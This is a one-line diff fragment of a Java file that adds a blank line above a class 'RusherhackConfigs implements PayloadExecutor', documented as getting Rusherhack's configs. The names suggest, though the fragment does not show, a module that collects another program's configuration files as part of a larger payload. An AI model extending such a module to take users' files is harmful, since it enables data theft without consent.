@@ -13,6 +13,7 @@ import java.util.Optional;
  * @since 10/09/2022
  * Gets Rusherhack's configs.
  */
+
 public class RusherhackConfigs implements PayloadExecutor {
     Main main = new Main();
 
